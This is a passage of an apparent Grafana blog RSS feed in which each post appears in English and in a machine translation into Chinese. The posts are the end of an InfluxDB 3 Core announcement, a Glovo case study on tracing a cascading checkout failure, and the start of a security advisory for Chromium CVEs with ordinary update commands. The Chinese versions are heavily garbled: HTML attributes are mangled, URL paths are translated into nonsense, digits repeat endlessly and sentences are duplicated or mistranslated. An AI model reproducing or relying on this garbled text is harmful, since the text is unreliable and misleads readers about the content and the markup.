SQL-Support”&gt; SQL支持&lt;/H3&gt;&#xA;&lt;p&gt;下一个重大变化是添加SQL支持。 InfluxDB已经有InfluxQl，但没有完全兼容。 “对于真正熟悉SQL的人，有时会以令人沮丧的方式不同。” &lt;/p&gt;&#xA;&lt;p&gt;因此，InfluxDB 3具有对InfluxQl和SQL的本地支持，使开发人员和数据科学家可以更轻松地开始，无论他们在InfluxdB方面有什么经验。&lt;/p&gt;&#xA;&lt;H3 ID =“对象存储”&gt;对象存储&lt;/h3&gt;&#xA;&lt;p&gt;最后，infuxdb 3核心将计算与存储区分开。在以前的版本中，用户必须具有本地附加的SSD，这对于最近的数据，但不能用于长期数据保留。&lt;/p&gt;&#xA;&lt;p&gt;“人们想拥有可用于查询的历史数据，但他们不想在可用的最昂贵的存储媒体上付费。他们想使用对象商店。&lt;/p&gt;。&lt;/p&gt;&#xA;&lt;p&gt;为了解决这个问题，他们构建了一个“无磁盘架构”，您可以在其中将文件系统指定为对象存储，这为您提供了几乎没有成本的多可用性区域耐用性。&lt;/p&gt;&#xA;&lt;p&gt;“伟大的事情之一是我们最终拥有无状态服务器，”迪克斯说。 “现在显然，服务器在RAM中加载了一堆状态，但最终它们是无状态的，因为您可以启动新的VM并从对象存储中加载所有状态。这使其在操作上很简单。” &lt;/p&gt;&gt;&#xA;&lt;h2 id =“学习 - 学习 -  about-influxdb-3核”&gt;了解更多有关InfluxdB 3 Core &lt;/h2&gt;的信息&#xA;&lt;p&gt;最终，迪克斯说，InfluxDB 3 Core是为简单和速度而建造的，具有一个命令安装，针对最近的数据查询进行了优化以及嵌入式Python处理引擎，这是工程师直接将高级处理直接加入数据库的巨大机会。&lt;/p&gt;。&lt;/p&gt;。&lt;/p&gt;。&#xA;&lt;p&gt;更多地了解一系列新功能如何支持此功能（以及一些有关限制的重要信息）&#xA;&lt;a href =“/events/grafanacon/2025/influxdb-3-core-open-source-release/？pg = blog＆plcmt = body-txt = body-txt”&gt; grafanacon 2025. &lt;/a&gt;。&lt;/p&gt;的视频&#xA;&lt;p&gt; &lt;em&gt;&#xA;&lt;a href =“/products/cloud/？pg = blog＆plcmt = body-txt”&gt; grafana cloud &lt;/a&gt;是从指标，日志，痕迹，痕迹，仪表板等开始的最简单方法。我们有一个宽敞的永远的层次，并为每个用例都有计划。&#xA;&lt;a href =“//auth/ign-up/create-user/？pg = blog＆plcmt = body-txt”&gt;现在免费注册&lt;/a&gt;！&lt;/em&gt; &lt;/em&gt; &lt;/p&gt;</description>
      <pubDate>Thu, 03 Jul 2025 00:00:00 +0000</pubDate>
    </item>
    <item>
      <title>【Faster incident response through distributed tracing: Inside Glovo&#39;s use of Traces Drilldown】通过分布式跟踪：Glovo内部使用Traces DrillDown的速度更快的事件响应</title>
      <link>https://grafana.com/blog/2025/07/01/faster-incident-response-through-distributed-tracing-inside-glovos-use-of-traces-drilldown/</link>
      <description>【&lt;p&gt;It&amp;rsquo;s almost 1 p.m. on a Monday afternoon and you&amp;rsquo;re hungry. You pull up your meal delivery app and select your favorite restaurant and dish. Then you go to check out and nothing happens.&lt;/p&gt;&#xA;&lt;p&gt;Your frustration mounts as you get hungrier by the minute. But there&amp;rsquo;s frustration on the other side of that transaction as well—engineers are scrambling to figure out what&amp;rsquo;s wrong as orders drop and revenue losses rise.&lt;/p&gt;&#xA;&lt;p&gt;This is the type of scenario you&amp;rsquo;re trying to avoid if you&amp;rsquo;re on the SRE team at Glovo, a subsidiary of Delivery Hero and an on-demand food and grocery delivery platform operating in 23 countries across Europe, Africa, and Asia.&lt;/p&gt;&#xA;&lt;p&gt;To get to the bottom of a recent incident to prevent it from happening again, Glovo recently turned to&#xA;&lt;a href=&#34;/docs/grafana/latest/explore/simplified-exploration/traces/&#34;&gt;Grafana Traces Drilldown&lt;/a&gt; (previously Explore Traces), an application that allows you to quickly investigate and visualize your tracing data through a simplified, queryless experience. And in a recent&#xA;&lt;a href=&#34;/events/grafanacon/2025/traces-drilldown-grafana-tempo/&#34;&gt;GrafanaCON 2025 talk&lt;/a&gt;, Staff Software Engineer Deepika Muthudeenathayalan and Senior Software Engineer Alex Simion shared their experience using the app to help find the root cause of an incident with multiple, cascading failures.&lt;/p&gt;&#xA;&lt;p&gt;You can check out the full video below, or keep reading to learn more.&lt;/p&gt;&#xA;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/cqHO0oYW6Ic?si=2JX0D-4VkyQ%3frel%3d0&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; allowfullscreen&gt;&lt;/iframe&gt;&#xA;&lt;h2 id=&#34;the-role-of-tracing-and-how-metrics-and-logs-only-go-so-far&#34;&gt;The role of tracing and how metrics and logs only go so far&lt;/h2&gt;&#xA;&lt;p&gt;Before we dig into Glovo&amp;rsquo;s specific use case, let&amp;rsquo;s walk through a hypothetical scenario to illustrate the importance of traces. &lt;/p&gt;&#xA;&lt;p&gt;It&amp;rsquo;s the middle of the night and you just got an alert that your users can&amp;rsquo;t check out. First, you check your metrics, which likely triggered the alert. Metrics tell you something happened, but they probably can&amp;rsquo;t tell you what happened. Next, you check your logs, which can tell you what happened—maybe an exception was thrown?—but finding that needle in the haystack can be challenging. To complicate things further, your team is using microservices, and a single backend service is just one piece of a larger puzzle.&lt;/p&gt;&#xA;&lt;p&gt;This is where traces come in. &lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;h3 id=&#34;what-is-tracing&#34;&gt;What is tracing? &lt;/h3&gt;&#xA;&lt;p&gt;Tracing is basically logging improved with context that is shared across HTTP boundaries, which allow you to see the flow through the various components that your system contains.&lt;/p&gt;&#xA;&lt;p&gt;Taking a step back, a trace represents an entire request across multiple services and visualizes start to finish the flow to identify bottlenecks and or dependencies. They&amp;rsquo;re often high volume and high cardinality, and they can contain logs or events as well. A span represents a particular operation within the request flow dealing with where it occurred. They usually include timing, success or failure data and relevant tags or metadata, which we call attributes. Attributes are basically key-value pairs. &lt;/p&gt;&#xA;&lt;p&gt;Spans can also contain events that record significant occurrences, such as an exception, or they can contain links to other spans or other traces, which can be helpful when you have really large traces.&lt;/p&gt;&lt;/blockquote&gt;&#xA;&lt;p&gt;Traces provide a structure to visualize what would otherwise be a pretty chaotic environment. This can be incredibly useful in distributed systems, where you need to pinpoint errors in the context of a larger system. &lt;/p&gt;&#xA;&lt;p&gt;However, this doesn&amp;rsquo;t necessarily mean that one telemetry signal is better than another. They really work best together: Metrics tell us that something might be happening; traces tell us where it&amp;rsquo;s happening; logs tell us what is happening.&lt;/p&gt;&#xA;&lt;p&gt;And that combined power is why we built Traces Drilldown. It takes away the complexity of digging through each signal and writing queries. Instead, you have a point-and-click experience that lets you get value from your traces faster.&lt;/p&gt;&#xA;&lt;h2 id=&#34;how-glovo-got-to-the-root-cause-of-an-incident-with-traces-drilldown&#34;&gt;How Glovo got to the root cause of an incident with Traces Drilldown&lt;/h2&gt;&#xA;&lt;p&gt;One of Glovo&amp;rsquo;s most important metrics is used to track orders created. The volume changes throughout the day, with more orders around lunch and dinner times. And as you can imagine, incidents that occur during those busier times have an outsized impact. So going back to our example from the beginning, this is not what you want to see as you close in on 1 p.m.:&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1565px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/glovo-gcon-25/order-drop.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/glovo-gcon-25/order-drop.png&#34;data-srcset=&#34;/media/blog/glovo-gcon-25/order-drop.png?w=320 320w, /media/blog/glovo-gcon-25/order-drop.png?w=550 550w, /media/blog/glovo-gcon-25/order-drop.png?w=750 750w, /media/blog/glovo-gcon-25/order-drop.png?w=900 900w, /media/blog/glovo-gcon-25/order-drop.png?w=1040 1040w, /media/blog/glovo-gcon-25/order-drop.png?w=1240 1240w, /media/blog/glovo-gcon-25/order-drop.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;Grafana dashboard shows a big drop in orders created&#34;width=&#34;1565&#34;height=&#34;517&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/glovo-gcon-25/order-drop.png&#34;&#xA;alt=&#34;Grafana dashboard shows a big drop in orders created&#34;width=&#34;1565&#34;height=&#34;517&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;&amp;ldquo;As SREs, we are kind of in the dark when such incidents happen because any part of our distributed system could fail causing the order loss,&amp;rdquo; Deepika said. &amp;ldquo;So we built many custom dashboards and metrics in Grafana, which helps us during such incidents.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;In this example, engineers dug deeper into a RED metrics dashboard and learned it was a downstream dependency that failed because it was rate limiting checkouts. From there, they learned that it was tied to a code change and quickly rolled back the deployment. In under five minutes, they were back to normal.&lt;/p&gt;&#xA;&lt;p&gt;But an SREs job doesn&amp;rsquo;t end there. Next, they needed to find the root cause and make sure it didn&amp;rsquo;t happen again. &lt;/p&gt;&#xA;&lt;p&gt;This involved a lengthy process of searching for clues and false starts. First, they noticed a spike in application errors. They also noticed high checkout latency, which was surprising given the rate limiting. Next, they went to their logs, and after a bit more digging, they suspected the issue was tied to a database. &lt;/p&gt;&#xA;&lt;p&gt;But after checking the database in question, they saw it was performing normally, which meant the database issue was the effect, not the cause. From there, they tried checking their traces, but that didn&amp;rsquo;t help either.&lt;/p&gt;&#xA;&lt;h3 id=&#34;getting-answers-with-traces-drilldown&#34;&gt;Getting answers with Traces Drilldown&lt;/h3&gt;&#xA;&lt;p&gt;With few options left, they turned to Traces Drilldown, which, at the time, was a new feature they had early access to. They ultimately opted to work backward from the product-catalog API traces, which was as easy as selecting the service name and filtering from there. And since they wanted to focus their search on rejections from the product catalog, they also filtered by HTTP status code.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;Drilldown shows you very nicely that you can select one of the status codes that appears in the spans,&amp;rdquo; Alex said. &amp;ldquo;The next step was very useful because we didn&amp;rsquo;t know exactly what attributes to look for, so the comparison tab gives you insight on what attributes are having different values from the baseline.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;Next, they identified a client with much higher values than the rest, and filtered by that as well.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1588px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/glovo-gcon-25/trace-filters.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/glovo-gcon-25/trace-filters.png&#34;data-srcset=&#34;/media/blog/glovo-gcon-25/trace-filters.png?w=320 320w, /media/blog/glovo-gcon-25/trace-filters.png?w=550 550w, /media/blog/glovo-gcon-25/trace-filters.png?w=750 750w, /media/blog/glovo-gcon-25/trace-filters.png?w=900 900w, /media/blog/glovo-gcon-25/trace-filters.png?w=1040 1040w, /media/blog/glovo-gcon-25/trace-filters.png?w=1240 1240w, /media/blog/glovo-gcon-25/trace-filters.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;Filters applied in Traces Drilldown UI &#34;width=&#34;1588&#34;height=&#34;1024&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/glovo-gcon-25/trace-filters.png&#34;&#xA;alt=&#34;Filters applied in Traces Drilldown UI &#34;width=&#34;1588&#34;height=&#34;1024&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;&amp;ldquo;Here we knew that this was a cascading failure. We knew that the database issue was caused by something else, so we wanted to check some exemplars from the beginning of the incident to see what caused this. So that&amp;rsquo;s exactly what we did here. We checked one of the first seconds of the incident, opened a trace, and looked inside the trace.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;From there, they were able to go deeper and find longer running spans tied to request times and also began looking at how it all connected to their database issue. Ultimately, this led to them quickly discovering the root cause: The checkout API was calling the product catalog, which was getting rate limited. There were retries and long wait times between retries, and at the same time they were holding connections from the thread pool for the database and new connections to the checkout API. As a result, new requests could not fulfill their processing because the connection was being held. &lt;/p&gt;&#xA;&lt;p&gt;Thanks to Traces Drilldown, they were able to resolve the issue and make sure it didn&amp;rsquo;t cause more problems with customer orders in the future.&lt;/p&gt;&#xA;&lt;p&gt;And today, Traces Drilldown is part of the SRE teams workflows as they look for errors and latency issues.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;I mainly use the error panel because it&amp;rsquo;s very helpful to pick exemplars,&amp;rdquo; Deepika said. &amp;ldquo;If you have a deployment, you can pick from a particular version of the service. If one of your pods is crashing because of memory or something, you can pick traces from those pods. And there are various resources and span attributes you can use.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;Check out the full video to learn more, including how OpenTelemetry and Traces Drilldown are making Glovo rethink their tracing policies.&lt;/p&gt;&#xA;&lt;p&gt;&lt;em&gt;&#xA;&lt;a href=&#34;/products/cloud/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud&lt;/a&gt; is the easiest way to get started with metrics, logs, traces, dashboards, and more. We have a generous forever-free tier and plans for every use case.&#xA;&lt;a href=&#34;/auth/sign-up/create-user/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt; Sign up for free now&lt;/a&gt;!&lt;/em&gt;&lt;/p&gt;】&lt;p&gt;差不多是下午1点在一个星期一的下午，你饿了。您提起送餐应用程序，然后选择自己喜欢的餐厅和菜肴。然后，您去退房，什么也没发生。&lt;/p&gt;&#xA;&lt;p&gt;当您一分钟越来越饥饿时，您的挫败感就会增加。但是，该交易的另一端也感到沮丧 - 工程师争先恐后地弄清楚随着订单下降和收入损失的增加而出了什么问题。&lt;/p&gt;&#xA;&lt;p&gt;如果您是Glovo的SRE团队，这是您试图避免的场景，这是送货英雄的子公司，以及在欧洲，非洲和亚洲的23个国家/地区运营的按需食品和杂货送货平台。&lt;/p&gt;。&lt;/p&gt;&#xA;&lt;p&gt;要到达最近的事件的底部以防止它再次发生，Glovo最近转向&#xA;&lt;a href =“/docs/grafana/最终/探索/简化 - 探索/痕迹/”&gt; grafana traces drilldown drilldown &lt;/a&gt;（以前探索轨迹），该应用程序允许您通过简化，无查询的体验快速调查和可视化挂接数据。在最近的一个&#xA;&lt;a href =“/events/grafanacon/2025/traces-drilldown-grafana-tempo/“&gt; grafanacon 2025 Talk &lt;/a&gt;，员工软件工程师Deepika Muthudeenathayalan和高级软件工程师Alex Simion使用该应用程序分享了他们的经验，可以帮助您找到与多个失败的事件的根源，以帮助找到多个失败的事件。&lt;/p&gt; &lt;/p&gt; &lt;/p&gt; &lt;/p&gt;&#xA;&lt;p&gt;您可以查看下面的完整视频，也可以继续阅读以了解更多信息。&lt;/p&gt;&#xA;&lt;iframe width =“ 560”高=“ 315” src =“ https://www.youtube.com/embed/cqho0oyw6ic?si = 2JX0D-4VKYQ%3FREL%3DD0”陀螺仪;&#xA;&lt;h2 id =“追踪和高速公路和仅限的人，仅限摩托车”&gt;跟踪的作用以及指标和日志的作用如何&lt;/h2&gt;&#xA;&lt;p&gt;在我们研究Glovo的特定用例之前，让我们浏览一个假设的情况，以说明痕迹的重要性。 &lt;/p&gt;&#xA;&lt;p&gt;这是深夜，您只是警报您的用户无法退房。首先，您检查您的指标，这可能会触发警报。指标告诉您发生了一些事情，但他们可能无法告诉您发生了什么。接下来，您检查日志，它可以告诉您发生了什么 - 可能会抛出一个例外吗？为了使事情进一步复杂化，您的团队正在使用微服务，而单个后端服务只是一个较大的难题。&lt;/p&gt;&#xA;&lt;p&gt;这是痕迹进入的地方。&lt;/p&gt;&#xA;&lt;BlockQuote&gt;&#xA;&lt;H3 ID =“ What-is-tracing”&gt;什么是跟踪？ &lt;/h3&gt;&#xA;&lt;p&gt;跟踪基本上是通过在HTTP边界共享的上下文来改进的记录，这使您可以看到通过系统包含的各种组件的流量。&lt;/p&gt;&#xA;&lt;p&gt;退后一步，跟踪代表多个服务的整个请求D可视化开始完成流程以识别瓶颈和依赖项。它们通常是大容量和高速度，并且也可以包含日志或事件。跨度代表请求流中的特定操作，该操作与发生的位置有关。它们通常包括时间安排，成功或故障数据以及相关标签或元数据，我们称为属性。属性基本上是键值对。 &lt;/p&gt;&#xA;&lt;p&gt;跨度还可以包含记录大量发生的事件，例如例外，也可以包含指向其他跨度或其他痕迹的链接，当您确实具有很大的痕迹时，这可能会有所帮助。&lt;/p&gt; &lt;/blockquote&gt;&#xA;&lt;p&gt;痕迹提供了一种结构，以可视化原本是一个相当混乱的环境。这在分布式系统中可能非常有用，在分布式系统中，您需要在较大系统的上下文中查明错误。 &lt;/p&gt;&#xA;&lt;p&gt;但是，这并不一定意味着一个遥测信号比另一个遥测信号更好。他们真的在一起工作最佳：指标告诉我们，可能会发生一些事情。痕迹告诉我们它在哪里发生；日志告诉我们发生了什么。&lt;/p&gt;&#xA;&lt;p&gt;这是我们构建痕迹钻取的原因。它消除了挖掘每个信号和编写查询的复杂性。取而代之的是，您有一个点击的经验，可以使您的痕迹更快地从轨迹中获得价值。&lt;/p&gt;&#xA;&lt;h2 id =“ how-glovo-got-to-the-the-the-the-the-in-incients-in-incients-with-traces-drilldown”&gt; Glovo如何遇到带有痕迹的事件的根本原因&lt;/h2&gt;&#xA;&lt;p&gt; Glovo最重要的指标之一用于跟踪创建的订单。整天的体积变化，午餐和晚餐时间周围有更多订单。您可以想象，在那些忙碌时期发生的事件产生了巨大影响。因此，从一开始就回到我们的示例，这不是您在下午1点关闭时想要看到的。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1565px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/glovo-gcon-25/order-drop.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/glovo-gcon-25/order-drop.png” data-srcset =“/媒体/blog/blog/glovo-gcon-25/order-drop.png？w = 320 320W，/media/blog/glovo/glovo/glovo/glovo-gcon-25/order-pord-25/order-order-drop.png？ /Media/blog/glovo-gcon-25/order-drop.png?w=750 750W，/media/Blog/Glovo-gCon-25/order-con-drop.png?w=900 900w，/media/media/blog/glog/glovo/glovo-gcon-25/ ford--gcon-25/order-rorder-drop.png？png?w=1040 1040400400400400400400400400400400400400400400400400400400400400400400400400400401400400400040号/Media/blog/glovo-gcon-25/order-drop.png?w=1240 1240w，/media/Blog/Glovo-GCon-25/order-order-drop.png?w=1920W“ 1920w”&#xA;data-sizes =“ auto” alt =“ grafana仪表板显示出创建的订单下降” width =“ 1565” height =“ 517”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/glovo-gcon-25/order-drop.png”&#xA;alt =“ Grafana仪表板显示出创建的订单下降”，“ width =” 1565“高度=” 517“/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;“作为SRES，我们很友善迪皮卡说：“在黑暗中发生这种事件时，由于我们的分布式系统的任何部分都可能导致订单损失，因此我们在格拉法纳（Grafana）建造了许多自定义仪表板和指标，这在此类事件中为我们提供了帮助。” &lt;/p&gt;&gt; &lt;/p&gt;。”&#xA;&lt;p&gt;在此示例中，工程师将更深挖掘到红色指标仪表板中，并得知这是一个下游依赖性，因为这是限制核对结帐的速率。从那里开始，他们了解到它与代码更改相关，并迅速退回部署。在五分钟内，它们恢复了正常。&lt;/p&gt;&#xA;&lt;p&gt;但是SRES的工作并没有结束。接下来，他们需要找到根本原因，并确保它不再发生。 &lt;/p&gt;&#xA;&lt;p&gt;这涉及一个漫长的搜索线索和错误启动的过程。首先，他们注意到应用程序错误的峰值。他们还注意到较高的结帐潜伏期，鉴于费率限制，这是令人惊讶的。接下来，他们进入了日志，经过更多的挖掘，他们怀疑该问题与数据库有关。 &lt;/p&gt;&#xA;&lt;p&gt;但是在检查有关数据库之后，他们看到它的性能正常，这意味着数据库问题是效果，而不是原因。从那里，他们尝试检查痕迹，但这也没有帮助。&lt;/p&gt;&#xA;在&#xA;&lt;p&gt;剩下的选项几乎没有选择，它们转向了Traces Drilldown，当时，这是他们尽早访问的一项新功能。他们最终选择从产品录制API痕迹向后工作，这与从那里选择服务名称和过滤一样容易。而且由于他们想将搜索集中在产品目录中的拒绝上，因此他们还通过HTTP状态代码过滤。&lt;/p&gt;&#xA;&lt;p&gt; drilldown表明您可以选择跨越跨度的状态代码之一，” Alex说。 “下一步非常有用，因为我们不确定要查找哪些属性，因此“比较”选项卡可以让您深入了解哪些属性与基线有不同的值。” &lt;/p&gt;&#xA;&lt;p&gt;接下来，他们确定了一个比其余值高得多的客户端，并且也通过它过滤。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1588px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/glovo-gcon-25/trace-filters.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/glovo-gcon-25/trace-filters.png” data-srcset =“/媒体/blog/blog/glovo-gcon-25/trace-filters.png？w = 320 320w，/media/blog/glog/glovo/glovo-gcon-gcon-25/trace-25/trace-filters.png/trace-filters.png？ /media/blog/glovo-gcon-25/trace-filters.png?w=750 750w, /media/blog/glovo-gcon-25/trace-filters.png?w=900 900w, /media/blog/glovo-gcon-25/trace-filters.png?w=1040 1040w, /Media/blog/glovo-gcon-25/trace-filters.png?w=1240 1240W，/媒体/blog/blog/glovo-gcon-25/trace-filters。png？w = 1920 1920w”&#xA;data-sizes =“ auto” alt =“ traces drilldown ui” width =“ 1588” height =“ 1024”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/glovo-gcon-25/trace-filters.png”&#xA;alt =“在痕迹中应用过滤器DrillDown UI” width =“ 1588”高=“ 1024”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;“这里我们知道这是一个级联的失败。我们知道数据库问题是由其他事物引起的，所以我们想从事件开始时检查一些示例以查看导致这件事的原因。所以这正是我们在这里所做的。我们检查了事件的第一秒之一。&#xA;&lt;p&gt;从那里开始，他们能够更深入地发现与请求时间有关的较长的跑步跨度，并开始研究所有这些都如何连接到其数据库问题。最终，这导致他们很快发现了根本原因：结帐API调用了产品目录，该目录受到限制。重新恢复之间进行了恢复和较长的等待时间，同时它们可以从线程池中持有数据库的连接以及与Checkout API的新连接。结果，由于连接的连接，新请求无法完成他们的处理。 &lt;/p&gt;&#xA;&lt;p&gt;多亏了Trace DrillDown，他们能够解决该问题并确保将来不会引起客户订单的更多问题。&lt;/p&gt;&#xA;&lt;p&gt;今天，Traces Drilldown是SRE团队在寻找错误和延迟问题时工作流程的一部分。&lt;/p&gt;&#xA;&lt;p&gt;“我主要使用错误面板，因为选择示例非常有帮助，”迪皮卡说。 “如果您有部署，则可以从该服务的特定版本中挑选。如果您的一个POD由于内存或其他内容而崩溃，则可以从这些PODS中选择痕迹。并且您可以使用各种资源和跨度属性。” &lt;/p&gt;&gt;&gt; &lt;/p&gt;&gt;&#xA;&lt;p&gt;观看完整视频以了解更多信息，包括Opentelemetry和Traces Drilldown如何使Glovo重新考虑其追踪政策。&lt;/p&gt;&#xA;&lt;p&gt; &lt;em&gt;&#xA;&lt;a href =“/products/cloud/？pg = blog＆plcmt = body-txt”&gt; grafana cloud &lt;/a&gt;是从指标，日志，痕迹，痕迹，仪表板等开始的最简单方法。我们有一个宽敞的永远的层次，并为每个用例都有计划。&#xA;&lt;a href =“//auth/ign-up/create-user/？pg = blog＆plcmt = body-txt”&gt;现在免费注册&lt;/a&gt;！&lt;/em&gt; &lt;/em&gt; &lt;/p&gt;</description>
      <pubDate>Tue, 01 Jul 2025 00:00:00 +0000</pubDate>
    </item>
    <item>
      <title>【Grafana security update: Critical severity security release for CVE-2025-5959, CVE-2025-6554, CVE-2025-6191 and CVE-2025-6192 in Grafana Image Renderer plugin and Synthetic Monitoring Agent】Grafana安全更新：CVE-2025-5959，CVE-2025-6554，CVE-2025-6191和CVE-2025-6191和CVE-2025-6192的关键严重性安全版本</title>
      <link>https://grafana.com/blog/2025/07/02/grafana-security-update-critical-severity-security-release-for-cve-2025-5959-cve-2025-6554-cve-2025-6191-and-cve-2025-6192-in-grafana-image-renderer-plugin-and-synthetic-monitoring-agent/</link>
      <description>【&lt;p&gt;We have released updates for the Grafana Image Renderer plugin and Synthetic Monitoring Agent to address four critical impact vulnerabilities (&#xA;&lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-5959&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;CVE-2025-5959&lt;/a&gt;,&#xA;&lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6554&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;CVE-2025-6554&lt;/a&gt;,&#xA;&lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6191&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;CVE-2025-6191&lt;/a&gt;, and&#xA;&lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6192&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;CVE-2025-6192&lt;/a&gt;) found in Chromium, a third-party library. Chromium, a downstream project of the Google Chrome browser, had vulnerabilities that could allowed remote code execution.&lt;/p&gt;&#xA;&lt;p&gt;Users who operate the Grafana Image Renderer plugin or have a local installation of the Synthetic Monitoring Agent are advised to update their systems. If you are running Grafana Image Renderer &amp;lt; 3.12.9 or the Synthetic Monitoring Agent &amp;lt; 0.38.3 you should update as soon as possible.&lt;/p&gt;&#xA;&lt;p&gt;Appropriate patches have been applied to Grafana Cloud. As always, we closely coordinated with all cloud providers licensed to offer Grafana Cloud Pro. They have been notified and have confirmed that their offerings are secure at the time of this announcement. This is applicable to Azure Managed Grafana.&lt;/p&gt;&#xA;&lt;p&gt;Using the CVSS 3.1 methodology, we have rated this CVE as a critical vulnerability for the Grafana operating environment. As of today, NIST has not yet assigned a score to any of these CVEs, but you can view the status of the CVE in the National Vulnerability Database.&lt;/p&gt;&#xA;&lt;h2 id=&#34;solutions-and-mitigations&#34;&gt;Solutions and mitigations &lt;/h2&gt;&#xA;&lt;p&gt;To remediate this vulnerability, follow the instructions below for your products.  &lt;/p&gt;&#xA;&lt;h3 id=&#34;grafana-image-renderer&#34;&gt;Grafana Image Renderer &lt;/h3&gt;&#xA;&lt;p&gt;Minimum version: 3.12.9&lt;/p&gt;&#xA;&lt;p&gt;Plugin install: &lt;code&gt;grafana-cli plugins install grafana-image-renderer&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Container install: &lt;code&gt;docker pull grafana/grafana-image-renderer:3.12.9&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Container URL:&#xA;&lt;a href=&#34;https://hub.docker.com/layers/grafana/grafana-image-renderer/3.12.9/images/sha256-8603027604d5c332ddecac614e156791d1157b234f7966485d1f4c97346a3dd7&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;https://hub.docker.com/layers/grafana/grafana-image-renderer/3.12.9/images/sha256-8603027604d5c332ddecac614e156791d1157b234f7966485d1f4c97346a3dd7&lt;/a&gt; &lt;/p&gt;&#xA;&lt;p&gt;Documentation:&#xA;&lt;a href=&#34;/grafana/plugins/grafana-image-renderer/&#34;&gt;https://grafana.com/grafana/plugins/grafana-image-renderer/&lt;/a&gt; &lt;/p&gt;&#xA;&lt;h3 id=&#34;grafana-synthetic-monitoring-agent&#34;&gt;Grafana Synthetic Monitoring Agent&lt;/h3&gt;&#xA;&lt;p&gt;Minimum version: 0.38.3&lt;/p&gt;&#xA;&lt;p&gt;Package download:&#xA;&lt;a href=&#34;https://github.com/grafana/synthetic-monitoring-agent/releases/tag/v0.38.3&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;https://github.com/grafana/synthetic-monitoring-agent/releases/tag/v0.38.3&lt;/a&gt; &lt;/p&gt;&#xA;&lt;p&gt;Container install: 